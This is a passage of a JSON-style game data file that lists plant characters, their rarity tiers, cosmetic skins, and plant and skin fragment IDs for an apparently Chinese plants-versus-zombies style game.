{"32001433":"球果训练家森林之子超级装扮"}]},{"200158":"黑法师","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001580":"黑法师伴生装扮"},
{"32001581":"黑法师光环装扮"}]},{"200159":"太极木槿","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001590":"太极木槿伴生装扮"},
{"32001591":"太极木槿战装装扮"},
{"32001592":"太极木槿女仆装扮"}]},{"200160":"青蛇藤蔓","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001600":"青蛇藤蔓伴生装扮"}]},{"200161":"毁灭菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001610":"毁灭菇伴生装扮"},
{"32001611":"毁灭菇博士装扮"},
{"32001612":"毁灭菇勇武将军装扮"},]},{"200162":"叶子保护伞","jieshu":"4","pinzhi":"zise","zhuangban":[{"32001620":"叶子保护伞伴生装扮"}]},{"200163":"鸭梨","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001630":"鸭梨伴生装扮"},
{"32001631":"鸭梨椰子壳装扮"},
{"32001632":"鸭梨胖蜜蜂装扮"}]},{"200164":"金蝉花","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001640":"金蝉花伴生装扮"},
{"32001641":"金蝉花敦煌装扮"}]},{"200165":"藕花白龙","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001650":"藕花白龙伴生装扮"}]},{"200169":"魔藤","jieshu":"0","pinzhi":"lanse","zhuangban":[{"32001690":"魔藤伴生装扮"}]},{"200170":"悬浮洋芋","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001700":"悬浮洋芋伴生装扮"}]},{"200172":"祥云飞莲","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001720":"祥云飞莲伴生装扮"}]},
{"200175":"吸金磁","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001750":"吸金磁伴生装扮"}]},
{"200176":"钟馗石蕊","jieshu":"4","pinzhi":"zise","zhuangban":[{"32001760":"钟馗石蕊伴生装扮"}]},
{"200177":"幽潭婆罗","jieshu":"4","pinzhi":"zise","zhuangban":[{"32001770":"幽潭婆罗伴生装扮"}]},
{"200178":"安息木编钟","jieshu":"4","pinzhi":"lanse","zhuangban":[{"32001780":"安息木编钟伴生装扮"}]},
{"200179":"冰川菇","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001790":"冰川菇伴生装扮"}]},
{"200167":"草垛","jieshu":"0","pinzhi":"baise","zhuangban":[{"32001670":"草垛伴生装扮"}]},
{"200182":"宇宙苔藓","jieshu":"0","pinzhi":"baise","zhuangban":[{"32001820":"宇宙苔藓伴生装扮"}]},
{"200186":"重力树","jieshu":"4","pinzhi":"lvse","zhuangban":[{"32001860":"重力树伴生装扮"}]},
{"200183":"宇宙豌豆","jieshu":"4","pinzhi":"zise","zhuangban":[{"32001830":"宇宙豌豆伴生装扮"}]},
{"200184":"宇宙小喷菇","jieshu":"4","pinzhi":"lanse","zhuangban":[{"32001840":"宇宙小喷菇伴生装扮"}]},
{"200185":"宇宙坚果","jieshu":"4","pinzhi":"lvse","zhuangban":[{"32001850":"宇宙坚果伴生装扮"}]},
{"200187":"暗物质火龙果","jieshu":"4","pinzhi":"chengse","zhuangban":[{"32001870":"暗物质火龙果伴生装扮"}]},
{"1101":"豌豆射手碎片","pinzhi":"baise"},
{"1102":"向日葵碎片","pinzhi":"baise"},
{"1103":"坚果碎片","pinzhi":"baise"},
{"1104":"土豆地雷碎片","pinzhi":"baise"},
{"1105":"卷心菜投手碎片","pinzhi":"baise"},
{"1106":"冰冻生菜碎片","pinzhi":"baise"},
{"1110":"弹簧豆碎片","pinzhi":"baise"},
{"1111":"地刺碎片","pinzhi":"baise"},
{"1115":"巴豆碎片","pinzhi":"baise"},
{"1116":"双向射手碎片","pinzhi":"baise"},
{"1118":"噬碑藤碎片","pinzhi":"baise"},
{"1121":"玉米投手碎片","pinzhi":"baise"},
{"1133":"仙桃碎片","pinzhi":"baise"},
{"1134":"火葫芦碎片","pinzhi":"baise"},
{"1135":"白萝卜碎片","pinzhi":"baise"},
{"1136":"竹笋碎片","pinzhi":"baise"},
{"1138":"金盏花碎片","pinzhi":"baise"},
{"1149":"小喷菇碎片","pinzhi":"baise"},
{"1150":"大喷菇碎片","pinzhi":"baise"},
{"1153":"阳光豆碎片","pinzhi":"baise"},
{"1154":"花生射手碎片","pinzhi":"baise"},
{"1155":"磁力菇碎片","pinzhi":"baise"},
{"1156":"路灯花碎片","pinzhi":"baise"},
{"1157":"咖啡豆碎片","pinzhi":"baise"},
{"1164":"莲叶碎片","pinzhi":"baise"},
{"1166":"缠绕水草碎片","pinzhi":"baise"},
{"1179":"烤马铃薯碎片","pinzhi":"baise"},
{"1194":"灯笼草碎片","pinzhi":"baise"},
{"111106":"黄金叶碎片","pinzhi":"baise"},
{"111110":"大丽菊碎片","pinzhi":"baise"},
{"111141":"胆小荆棘碎片","pinzhi":"baise"},
{"111164":"黄金蓓蕾碎片","pinzhi":"baise"},
{"111165":"平顶菇碎片","pinzhi":"baise"},
{"22000170":"滴水冰莲碎片","pinzhi":"baise"},
{"22000300":"花盆碎片","pinzhi":"baise"},
{"22001380":"氧气藻碎片","pinzhi":"baise"},
{"1107":"回旋镖射手碎片","pinzhi":"lvse"},
{"1119":"寒冰豌豆碎片","pinzhi":"lvse"},
{"1120":"火炬树桩碎片","pinzhi":"lvse"},
{"1122":"闪电芦苇碎片","pinzhi":"lvse"},
{"1124":"西瓜投手碎片","pinzhi":"lvse"},
{"1125":"豌豆荚碎片","pinzhi":"lvse"},
{"1128":"钢地刺碎片","pinzhi":"lvse"},
{"1129":"高坚果碎片","pinzhi":"lvse"},
{"1130":"三重射手碎片","pinzhi":"lvse"},
{"1137":"棱镜草碎片","pinzhi":"lvse"},
{"1142":"脉冲黄桃碎片","pinzhi":"lvse"},
{"1163":"机枪石榴碎片","pinzhi":"lvse"},
{"1173":"甜薯碎片","pinzhi":"lvse"},
{"1176":"树脂投手碎片","pinzhi":"lvse"},
{"1178":"火焰豌豆射手碎片","pinzhi":"lvse"},
{"1182":"眩晕洋葱碎片","pinzhi":"lvse"},
{"1183":"旋转芜菁碎片","pinzhi":"lvse"},
{"1184":"大王花碎片","pinzhi":"lvse"},
{"1185":"旋风橡果碎片","pinzhi":"lvse"},
{"1188":"竹小弟碎片","pinzhi":"lvse"},
{"1189":"漩涡枇杷碎片","pinzhi":"lvse"},
{"1190":"电离红掌碎片","pinzhi":"lvse"},
{"1192":"飞碟瓜碎片","pinzhi":"lvse"},
{"1195":"旋转菠萝碎片","pinzhi":"lvse"},
{"111103":"榴莲碎片","pinzhi":"lvse"},
{"111114":"菠萝蜜碎片","pinzhi":"lvse"},
{"111127":"大蒜碎片","pinzhi":"lvse"},
{"111128":"复活萝卜碎片","pinzhi":"lvse"},
{"111137":"香水蘑菇碎片","pinzhi":"lvse"},
{"111152":"月光花碎片","pinzhi":"lvse"},
{"111153":"爆炸坚果碎片","pinzhi":"lvse"},
{"111191":"冬瓜守卫碎片","pinzhi":"lvse"},
{"22000030":"油橄榄碎片","pinzhi":"lvse"},
{"22000180":"石斛防风网碎片","pinzhi":"lvse"},
{"22001370":"噗噗鱼藤碎片","pinzhi":"lvse"},
{"1108":"双胞向日葵碎片","pinzhi":"lanse"},
{"1109":"菜问碎片","pinzhi":"lanse"},
{"1113":"能量花碎片","pinzhi":"lanse"},
{"1114":"窝瓜碎片","pinzhi":"lanse"},
{"1117":"火爆辣椒碎片","pinzhi":"lanse"},
{"1127":"双重射手碎片","pinzhi":"lanse"},
{"1132":"樱桃炸弹碎片","pinzhi":"lanse"},
{"1139":"激光豆碎片","pinzhi":"lanse"},
{"1140":"星星果碎片","pinzhi":"lanse"},
{"1141":"三叶草碎片","pinzhi":"lanse"},
{"1144":"全息坚果碎片","pinzhi":"lanse"},
{"1147":"胡萝卜导弹车碎片","pinzhi":"lanse"},
{"1151":"魅惑菇碎片","pinzhi":"lanse"},
{"1160":"橡木弓手碎片","pinzhi":"lanse"},
{"1162":"大力花菜碎片","pinzhi":"lanse"},
{"1168":"鳄梨碎片","pinzhi":"lanse"},
{"1169":"导向蓟碎片","pinzhi":"lanse"},
{"1170":"大嘴花碎片","pinzhi":"lanse"},
{"1174":"竹员外碎片","pinzhi":"lanse"},
{"1175":"莲小蓬碎片","pinzhi":"lanse"},
{"1177":"飓风甘蓝碎片","pinzhi":"lanse"},
{"1180":"辣椒投手碎片","pinzhi":"lanse"},
{"1186":"板栗小队碎片","pinzhi":"lanse"},
{"1191":"芦笋战机碎片","pinzhi":"lanse"},
{"1198":"玫瑰剑客碎片","pinzhi":"lanse"},
{"111101":"捣蛋萝卜碎片","pinzhi":"lanse"},
{"111104":"南瓜巫师碎片","pinzhi":"lanse"},
{"111108":"阿开木木碎片","pinzhi":"lanse"},
{"111109":"红针花碎片","pinzhi":"lanse"},
{"111111":"岩浆番石榴碎片","pinzhi":"lanse"},
{"111112":"金蟾菇碎片","pinzhi":"lanse"},
{"111113":"棉小雪碎片","pinzhi":"lanse"},
{"111115":"龙舌兰碎片","pinzhi":"lanse"},
{"111117":"梅小美碎片","pinzhi":"lanse"},
{"111118":"火龙果碎片","pinzhi":"lanse"},
{"111123":"魔音甜菜碎片","pinzhi":"lanse"},
{"111125":"潜伏芹菜碎片","pinzhi":"lanse"},
{"111126":"孢子菇碎片","pinzhi":"lanse"},
{"111135":"原始豌豆射手碎片","pinzhi":"lanse"},
{"111136":"原始坚果碎片","pinzhi":"lanse"},
{"111138":"原始向日葵碎片","pinzhi":"lanse"},
{"111151":"毒影菇碎片","pinzhi":"lanse"},
{"111156":"铃儿草投手碎片","pinzhi":"lanse"},
{"111168":"番莲工程师碎片","pinzhi":"lanse"},
{"22000160":"千金藤碎片","pinzhi":"lanse"},
{"22000430":"石楠探索者碎片","pinzhi":"lanse"},
{"22000600":"南瓜头碎片","pinzhi":"lanse"},
{"22001260":"爆浆玉露碎片","pinzhi":"lanse"},
{"22001360":"海蘑菇碎片","pinzhi":"lanse"},
{"1123":"椰子加农炮碎片","pinzhi":"zise"},
{"1126":"变身茄子碎片","pinzhi":"zise"},
{"1159":"烈焰菇碎片","pinzhi":"zise"},
{"1161":"蒲公英碎片","pinzhi":"zise"},
{"1172":"幽灵辣椒碎片","pinzhi":"zise"},
{"1181":"甜菜护卫碎片","pinzhi":"zise"},
{"1193":"蚕豆突击队碎片","pinzhi":"zise"},
{"1199":"电击蓝莓碎片","pinzhi":"zise"},
{"111102":"向日葵歌手碎片","pinzhi":"zise"},
{"111116":"猕猴桃碎片","pinzhi":"zise"},
{"111120":"火柴花拳手碎片","pinzhi":"zise"},
{"111124":"逆时草碎片","pinzhi":"zise"},
{"111134":"缩小紫罗兰碎片","pinzhi":"zise"},
{"111139":"原始土豆地雷碎片","pinzhi":"zise"},
{"111140":"龙吼草碎片","pinzhi":"zise"},
{"111154":"夜影龙葵碎片","pinzhi":"zise"},
{"111158":"暗樱草碎片","pinzhi":"zise"},
{"111162":"槲寄冰仙子碎片","pinzhi":"zise"},
{"111163":"野兽猕猴桃碎片","pinzhi":"zise"},
{"111166":"莲藕射手碎片","pinzhi":"zise"},
{"111169":"吹风荚兰碎片","pinzhi":"zise"},
{"111173":"热辣海枣碎片","pinzhi":"zise"},
{"111176":"芭蕉舞蹈家碎片","pinzhi":"zise"},
{"111178":"水仙花射手碎片","pinzhi":"zise"},
{"111184":"暗影豌豆碎片","pinzhi":"zise"},
{"111186":"水晶兰碎片","pinzhi":"zise"},
{"111187":"豌豆迫击炮碎片","pinzhi":"zise"},
{"111189":"芦荟医师碎片","pinzhi":"zise"},
{"22000010":"小黄梨碎片","pinzhi":"zise"},
{"22000070":"杜英投手碎片","pinzhi":"zise"},
{"22000110":"铜钱草鼓手碎片","pinzhi":"zise"},
{"22000130":"潜行开口箭碎片","pinzhi":"zise"},
{"22000140":"暗影荚兰碎片","pinzhi":"zise"},
{"22000270":"爆炸桔梗碎片","pinzhi":"zise"},
{"22000390":"气流水仙花碎片","pinzhi":"zise"},
{"22000490":"刺果流星锤碎片","pinzhi":"zise"},
{"22000500":"黄油毛艮碎片","pinzhi":"zise"},
{"22001350":"海带守卫碎片","pinzhi":"zise"},
{"22001420":"盒子草礼炮碎片","pinzhi":"zise"},
{"22001570":"胆小菇碎片","pinzhi":"zise"},
{"1112":"火龙草碎片","pinzhi":"chengse"},
{"1131":"冰西瓜投手碎片","pinzhi":"chengse"},
{"1143":"充能柚子碎片","pinzhi":"chengse"},
{"1145":"瓷砖萝卜碎片","pinzhi":"chengse"},
{"1152":"阳光菇碎片","pinzhi":"chengse"},
{"1158":"寒冰菇碎片","pinzhi":"chengse"},
{"1165":"保龄泡泡碎片","pinzhi":"chengse"},
{"1167":"香蕉火箭炮碎片","pinzhi":"chengse"},
{"1171":"强酸柠檬碎片","pinzhi":"chengse"},
{"1197":"魔术菇碎片","pinzhi":"chengse"},
{"111119":"天使星星果碎片","pinzhi":"chengse"},
{"111121":"火焰花女王碎片","pinzhi":"chengse"},
{"111122":"机枪射手碎片","pinzhi":"chengse"},
{"111129":"仙人掌碎片","pinzhi":"chengse"},
{"111130":"猫尾草碎片","pinzhi":"chengse"},
{"111131":"喇叭花碎片","pinzhi":"chengse"},
{"111132":"爆裂葡萄碎片","pinzhi":"chengse"},
{"111133":"冰龙草碎片","pinzhi":"chengse"},
{"111142":"原始大王花碎片","pinzhi":"chengse"},
{"111143":"蔗师傅碎片","pinzhi":"chengse"},
{"111144":"玉米加农炮碎片","pinzhi":"chengse"},
{"111145":"苹果迫击炮碎片","pinzhi":"chengse"},
{"111146":"金缕梅女巫碎片","pinzhi":"chengse"},
{"111147":"逃脱树根碎片","pinzhi":"chengse"},
{"111148":"电流醋栗碎片","pinzhi":"chengse"},
{"111149":"白瓜相扑手碎片","pinzhi":"chengse"},
{"111150":"超能花菜碎片","pinzhi":"chengse"},
{"111155":"幽暮投手碎片","pinzhi":"chengse"},
{"111160":"炙热山葵碎片","pinzhi":"chengse"},
{"111161":"防风草碎片","pinzhi":"chengse"},
{"111167":"芦黎药师碎片","pinzhi":"chengse"},
{"111170":"桑葚爆破手碎片","pinzhi":"chengse"},
{"111171":"电能豌豆碎片","pinzhi":"chengse"},
{"111172":"寒冰醋栗碎片","pinzhi":"chengse"},
{"111174":"郁金香号手碎片","pinzhi":"chengse"},
{"111175":"茄子忍者碎片","pinzhi":"chengse"},
{"111179":"双枪松果碎片","pinzhi":"chengse"},
{"111181":"警爆磁菇碎片","pinzhi":"chengse"},
{"111182":"冬青骑士碎片","pinzhi":"chengse"},
{"111185":"食人花豌豆碎片","pinzhi":"chengse"},
{"111188":"雷龙草碎片","pinzhi":"chengse"},
{"111190":"熊果臼炮碎片","pinzhi":"chengse"},
{"22000000":"电力绿茶碎片","pinzhi":"chengse"},
{"22000020":"宝石商石榴碎片","pinzhi":"chengse"},
{"22000040":"白露花战机碎片","pinzhi":"chengse"},
{"22000050":"爆炸草莓碎片","pinzhi":"chengse"},
{"22000060":"毒液豌豆射手碎片","pinzhi":"chengse"},
{"22000080":"飞镖洋蓟碎片","pinzhi":"chengse"},
{"22000090":"荸荠兄弟碎片","pinzhi":"chengse"},
{"22000100":"尖刺秋葵碎片","pinzhi":"chengse"},
{"22000120":"终极番茄碎片","pinzhi":"chengse"},
{"22000150":"凤梨链刃碎片","pinzhi":"chengse"},
{"22000190":"厨师杓兰碎片","pinzhi":"chengse"},
{"22000200":"粘液桉果碎片","pinzhi":"chengse"},
{"22000210":"橄榄坑碎片","pinzhi":"chengse"},
{"22000220":"刺眼花艺伎碎片","pinzhi":"chengse"},
{"22000230":"黏弹糯米碎片","pinzhi":"chengse"},
{"22000240":"地星发射井碎片","pinzhi":"chengse"},
{"22000250":"奶油生菜碎片","pinzhi":"chengse"},
{"22000260":"眩晕雏菊碎片","pinzhi":"chengse"},
{"22000280":"庆典汽水椰碎片","pinzhi":"chengse"},
{"22000290":"钩爪嘉兰碎片","pinzhi":"chengse"},
{"22000310":"凤仙花射手碎片","pinzhi":"chengse"},
{"22000320":"火鸡投手碎片","pinzhi":"chengse"},
{"22000330":"铁锤兰碎片","pinzhi":"chengse"},
{"22000340":"聚能山竹碎片","pinzhi":"chengse"},
{"22000350":"鱼钩草碎片","pinzhi":"chengse"},
{"22000370":"烈焰火蕨碎片","pinzhi":"chengse"},
{"22000380":"虎头菇碎片","pinzhi":"chengse"},
{"22000410":"地锯草碎片","pinzhi":"chengse"},
{"22000440":"树灵护卫碎片","pinzhi":"chengse"},
{"22000450":"疯帽菇碎片","pinzhi":"chengse"},
{"22000460":"魔法番红花碎片","pinzhi":"chengse"},
{"22000470":"公主弹簧草碎片","pinzhi":"chengse"},
{"22000480":"宊击竹兵碎片","pinzhi":"chengse"},
{"22000510":"激光皇冠花碎片","pinzhi":"chengse"},
{"22000520":"腐尸豆荚碎片","pinzhi":"chengse"},
{"22000530":"扇贝兰法师碎片","pinzhi":"chengse"},
{"22000540":"杰克南瓜灯碎片","pinzhi":"chengse"},
{"22000550":"豌豆药剂师碎片","pinzhi":"chengse"},
{"22000560":"双生卯兔碎片","pinzhi":"chengse"},
{"22000570":"长枪球兰碎片","pinzhi":"chengse"},
{"22000580":"牛蒡击球手碎片","pinzhi":"chengse"},
{"22000590":"吸血牛杆菌碎片","pinzhi":"chengse"},
{"22000610":"鹳草击剑手碎片","pinzhi":"chengse"},
{"22000620":"蓄电雪松果碎片","pinzhi":"chengse"},
{"22000630":"电能藤蔓碎片","pinzhi":"chengse"},
{"22000640":"蛇妖瓶子草碎片","pinzhi":"chengse"},
{"22000650":"流星花碎片","pinzhi":"chengse"},
{"22000660":"曼德拉草碎片","pinzhi":"chengse"},
{"22000670":"深渊海葵碎片","pinzhi":"chengse"},
{"22000680":"深渊魔爪花碎片","pinzhi":"chengse"},
{"22000690":"粉丝心叶兰碎片","pinzhi":"chengse"},
{"22000700":"豌豆藤蔓碎片","pinzhi":"chengse"},
{"22000710":"蜜蜂铃兰碎片","pinzhi":"chengse"},
{"22000720":"油菜花碎片","pinzhi":"chengse"},
{"22000730":"剑叶龙血树碎片","pinzhi":"chengse"},
{"22000740":"斯巴达竹碎片","pinzhi":"chengse"},
{"22000750":"闪耀藤蔓碎片","pinzhi":"chengse"},
{"22000760":"阳光韭菜碎片","pinzhi":"chengse"},
{"22000770":"暗夜菇碎片","pinzhi":"chengse"},
{"22000780":"柴堆藤蔓碎片","pinzhi":"chengse"},
{"22000790":"贪吃龙草碎片","pinzhi":"chengse"},
{"22000800":"兔极碎片","pinzhi":"chengse"},
{"22000810":"植甲拼装-炎星碎片","pinzhi":"chengse"},
{"22000820":"蝎尾蕉机枪手碎片","pinzhi":"chengse"},
{"22000830":"电鳗香蕉碎片","pinzhi":"chengse"},
{"22000840":"荆棘巫师碎片","pinzhi":"chengse"},
{"22000850":"锯齿锦地罗碎片","pinzhi":"chengse"},
{"22000860":"寄生仙钗碎片","pinzhi":"chengse"},
{"22000880":"暴君火龙果碎片","pinzhi":"chengse"},
{"22000890":"小暴君火龙果碎片","pinzhi":"chengse"},
{"22000900":"忧郁藤蔓碎片","pinzhi":"chengse"},
{"22000910":"电击鹰爪花碎片","pinzhi":"chengse"},
{"22000920":"留声曼陀罗碎片","pinzhi":"chengse"},
{"22000930":"疯狂炮仗花碎片","pinzhi":"chengse"},
{"22000940":"日月金银花碎片","pinzhi":"chengse"},
{"22000950":"蛮族大黄碎片","pinzhi":"chengse"},
{"22000960":"水生藤蔓碎片","pinzhi":"chengse"},
{"22000970":"寒霜白毛丹碎片","pinzhi":"chengse"},
{"22000980":"电击钩吻碎片","pinzhi":"chengse"},
{"22000990":"寒冰地刺碎片","pinzhi":"chengse"},
{"22001000":"珊瑚泡泡姬碎片","pinzhi":"chengse"},
{"22001010":"百宝兜兰碎片","pinzhi":"chengse"},
{"22001020":"女娲蛇尾草碎片","pinzhi":"chengse"},
{"22001270":"枫影刺客碎片","pinzhi":"chengse"},
{"22001280":"守卫菇碎片","pinzhi":"chengse"},
{"22001330":"伏僵塔黄碎片","pinzhi":"chengse"},
{"22001340":"超级机枪射手碎片","pinzhi":"chengse"},
{"22001390":"海神草碎片","pinzhi":"chengse"},
{"22001400":"海豌豆碎片","pinzhi":"chengse"},
{"22001430":"球果训练家碎片","pinzhi":"chengse"},
{"22001580":"黑法师碎片","pinzhi":"chengse"},
{"22001590":"太极木槿碎片","pinzhi":"chengse"},
{"22001600":"青蛇藤蔓碎片","pinzhi":"chengse"},
{"22001610":"毁灭菇碎片","pinzhi":"chengse"},
{"22001620":"叶子保护伞碎片","pinzhi":"zise"},
{"22001630":"鸭梨碎片","pinzhi":"chengse"},
{"22001640":"金蝉花碎片","pinzhi":"chengse"},
{"22001650":"藕花白龙碎片","pinzhi":"chengse"},
{"22001690":"魔藤碎片","pinzhi":"lanse"},
{"22001700":"悬浮洋芋碎片","pinzhi":"chengse"},
{"22001720":"祥云飞莲碎片","pinzhi":"chengse"},
{"22001750":"吸金磁碎片","pinzhi":"chengse"},
{"22001760":"钟馗石蕊碎片","pinzhi":"zise"},
{"22001770":"幽潭婆罗碎片","pinzhi":"zise"},
{"22001780":"安息木编钟碎片","pinzhi":"lanse"},
{"22001790":"冰川菇碎片","pinzhi":"chengse"},
{"22001670":"草垛碎片","pinzhi":"baise"},
{"22001820":"宇宙苔藓碎片","pinzhi":"baise"},
{"22001830":"宇宙豌豆碎片","pinzhi":"zise"},
{"22001840":"宇宙小喷菇碎片","pinzhi":"lanse"},
{"22001850":"宇宙坚果碎片","pinzhi":"lvse"},
{"22001860":"重力树碎片","pinzhi":"lvse"},
{"22001870":"暗物质火龙果碎片","pinzhi":"chengse"},
{"1301":"豌豆射手伴生装扮碎片","pinzhi":"baise"},
{"1302":"向日葵伴生装扮碎片","pinzhi":"baise"},
{"1303":"坚果伴生装扮碎片","pinzhi":"baise"},
{"1304":"土豆地雷伴生装扮碎片","pinzhi":"baise"},
{"1305":"卷心菜投手伴生装扮碎片","pinzhi":"baise"},
{"1306":"冰冻生菜伴生装扮碎片","pinzhi":"baise"},
{"1310":"弹簧豆伴生装扮碎片","pinzhi":"baise"},
{"1311":"地刺伴生装扮碎片","pinzhi":"baise"},
{"1315":"巴豆伴生装扮碎片","pinzhi":"baise"},
{"1316":"双向射手伴生装扮碎片","pinzhi":"baise"},
{"1318":"噬碑藤伴生装扮碎片","pinzhi":"baise"},
{"1321":"玉米投手伴生装扮碎片","pinzhi":"baise"},
{"1333":"仙桃伴生装扮碎片","pinzhi":"baise"},
{"1334":"火葫芦伴生装扮碎片","pinzhi":"baise"},
{"1335":"白萝卜伴生装扮碎片","pinzhi":"baise"},
{"1336":"竹笋伴生装扮碎片","pinzhi":"baise"},
{"1338":"金盏花伴生装扮碎片","pinzhi":"baise"},
{"1349":"小喷菇伴生装扮碎片","pinzhi":"baise"},
{"1350":"大喷菇伴生装扮碎片","pinzhi":"baise"},
{"1353":"阳光豆伴生装扮碎片","pinzhi":"baise"},
{"1354":"花生射手伴生装扮碎片","pinzhi":"baise"},
{"1355":"磁力菇伴生装扮碎片","pinzhi":"baise"},
{"1356":"路灯花伴生装扮碎片","pinzhi":"baise"},
{"1357":"咖啡豆伴生装扮碎片","pinzhi":"baise"},
{"1364":"莲叶伴生装扮碎片","pinzhi":"baise"},
{"1366":"缠绕水草伴生装扮碎片","pinzhi":"baise"},
{"1379":"烤马铃薯伴生装扮碎片","pinzhi":"baise"},
{"1394":"灯笼草伴生装扮碎片","pinzhi":"baise"},
{"111306":"黄金叶伴生装扮碎片","pinzhi":"baise"},
{"111310":"大丽菊伴生装扮碎片","pinzhi":"baise"},
{"111341":"胆小荆棘伴生装扮碎片","pinzhi":"baise"},
{"111364":"黄金蓓蕾伴生装扮碎片","pinzhi":"baise"},
{"111365":"平顶菇伴生装扮碎片","pinzhi":"baise"},
{"42000170":"滴水冰莲伴生装扮碎片","pinzhi":"baise"},
{"42000300":"花盆伴生装扮碎片","pinzhi":"baise"},
{"42001380":"氧气藻伴生装扮碎片","pinzhi":"baise"},
{"1307":"回旋镖射手伴生装扮碎片","pinzhi":"lvse"},
{"1319":"寒冰豌豆伴生装扮碎片","pinzhi":"lvse"},
{"1320":"火炬树桩伴生装扮碎片","pinzhi":"lvse"},
{"1322":"闪电芦苇伴生装扮碎片","pinzhi":"lvse"},
{"1324":"西瓜投手伴生装扮碎片","pinzhi":"lvse"},
{"1325":"豌豆荚伴生装扮碎片","pinzhi":"lvse"},
{"1328":"钢地刺伴生装扮碎片","pinzhi":"lvse"},
{"1329":"高坚果伴生装扮碎片","pinzhi":"lvse"},
{"1330":"三重射手伴生装扮碎片","pinzhi":"lvse"},
{"1337":"棱镜草伴生装扮碎片","pinzhi":"lvse"},
{"1342":"脉冲黄桃伴生装扮碎片","pinzhi":"lvse"},
{"1363":"机枪石榴伴生装扮碎片","pinzhi":"lvse"},
{"1373":"甜薯伴生装扮碎片","pinzhi":"lvse"},
{"1376":"树脂投手伴生装扮碎片","pinzhi":"lvse"},
{"1378":"火焰豌豆射手伴生装扮碎片","pinzhi":"lvse"},
{"1382":"眩晕洋葱伴生装扮碎片","pinzhi":"lvse"},
{"1383":"旋转芜菁伴生装扮碎片","pinzhi":"lvse"},
{"1384":"大王花伴生装扮碎片","pinzhi":"lvse"},
{"1385":"旋风橡果伴生装扮碎片","pinzhi":"lvse"},
{"1388":"竹小弟伴生装扮碎片","pinzhi":"lvse"},
{"1389":"漩涡枇杷伴生装扮碎片","pinzhi":"lvse"},
{"1390":"电离红掌伴生装扮碎片","pinzhi":"lvse"},
{"1392":"飞碟瓜伴生装扮碎片","pinzhi":"lvse"},
{"1395":"旋转菠萝伴生装扮碎片","pinzhi":"lvse"},
{"111303":"榴莲伴生装扮碎片","pinzhi":"lvse"},
{"111314":"菠萝蜜伴生装扮碎片","pinzhi":"lvse"},
{"111327":"大蒜伴生装扮碎片","pinzhi":"lvse"},
{"111328":"复活萝卜伴生装扮碎片","pinzhi":"lvse"},
{"111337":"香水蘑菇伴生装扮碎片","pinzhi":"lvse"},
{"111352":"月光花伴生装扮碎片","pinzhi":"lvse"},
{"111353":"爆炸坚果伴生装扮碎片","pinzhi":"lvse"},
{"111391":"冬瓜守卫伴生装扮碎片","pinzhi":"lvse"},
{"42000030":"油橄榄伴生装扮碎片","pinzhi":"lvse"},
{"42000180":"石斛防风网伴生装扮碎片","pinzhi":"lvse"},
{"42001370":"噗噗鱼藤伴生装扮碎片","pinzhi":"lvse"},
{"1308":"双胞向日葵伴生装扮碎片","pinzhi":"lanse"},
{"1309":"菜问伴生装扮碎片","pinzhi":"lanse"},
{"1313":"能量花伴生装扮碎片","pinzhi":"lanse"},
{"1314":"窝瓜伴生装扮碎片","pinzhi":"lanse"},
{"1317":"火爆辣椒伴生装扮碎片","pinzhi":"lanse"},
{"1327":"双重射手伴生装扮碎片","pinzhi":"lanse"},
{"1332":"樱桃炸弹伴生装扮碎片","pinzhi":"lanse"},
{"1339":"激光豆伴生装扮碎片","pinzhi":"lanse"},
{"1340":"星星果伴生装扮碎片","pinzhi":"lanse"},
{"1341":"三叶草伴生装扮碎片","pinzhi":"lanse"},
{"1344":"全息坚果伴生装扮碎片","pinzhi":"lanse"},
{"1347":"胡萝卜导弹车伴生装扮碎片","pinzhi":"lanse"},
{"1351":"魅惑菇伴生装扮碎片","pinzhi":"lanse"},
{"1360":"橡木弓手伴生装扮碎片","pinzhi":"lanse"},
{"1362":"大力花菜伴生装扮碎片","pinzhi":"lanse"},
{"1368":"鳄梨伴生装扮碎片","pinzhi":"lanse"},
{"1369":"导向蓟伴生装扮碎片","pinzhi":"lanse"},
{"1370":"大嘴花伴生装扮碎片","pinzhi":"lanse"},
{"1374":"竹员外伴生装扮碎片","pinzhi":"lanse"},
{"1375":"莲小蓬伴生装扮碎片","pinzhi":"lanse"},
{"1377":"飓风甘蓝伴生装扮碎片","pinzhi":"lanse"},
{"1380":"辣椒投手伴生装扮碎片","pinzhi":"lanse"},
{"1386":"板栗小队伴生装扮碎片","pinzhi":"lanse"},
{"1391":"芦笋战机伴生装扮碎片","pinzhi":"lanse"},
{"1398":"玫瑰剑客伴生装扮碎片","pinzhi":"lanse"},
{"111301":"捣蛋萝卜伴生装扮碎片","pinzhi":"lanse"},
{"111304":"南瓜巫师伴生装扮碎片","pinzhi":"lanse"},
{"111308":"阿开木木伴生装扮碎片","pinzhi":"lanse"},
{"111309":"红针花伴生装扮碎片","pinzhi":"lanse"},
{"111311":"岩浆番石榴伴生装扮碎片","pinzhi":"lanse"},
{"111312":"金蟾菇伴生装扮碎片","pinzhi":"lanse"},
{"111313":"棉小雪伴生装扮碎片","pinzhi":"lanse"},
{"111315":"龙舌兰伴生装扮碎片","pinzhi":"lanse"},
{"111317":"梅小美伴生装扮碎片","pinzhi":"lanse"},
{"111318":"火龙果伴生装扮碎片","pinzhi":"lanse"},
{"111323":"魔音甜菜伴生装扮碎片","pinzhi":"lanse"},
{"111325":"潜伏芹菜伴生装扮碎片","pinzhi":"lanse"},
{"111326":"孢子菇伴生装扮碎片","pinzhi":"lanse"},
{"111335":"原始豌豆射手伴生装扮碎片","pinzhi":"lanse"},
{"111336":"原始坚果伴生装扮碎片","pinzhi":"lanse"},
{"111338":"原始向日葵伴生装扮碎片","pinzhi":"lanse"},
{"111351":"毒影菇伴生装扮碎片","pinzhi":"lanse"},
{"111356":"铃儿草投手伴生装扮碎片","pinzhi":"lanse"},
{"111368":"番莲工程师伴生装扮碎片","pinzhi":"lanse"},
{"42000160":"千金藤伴生装扮碎片","pinzhi":"lanse"},
{"42000430":"石楠探索者伴生装扮碎片","pinzhi":"lanse"},
{"42000600":"南瓜头伴生装扮碎片","pinzhi":"lanse"},
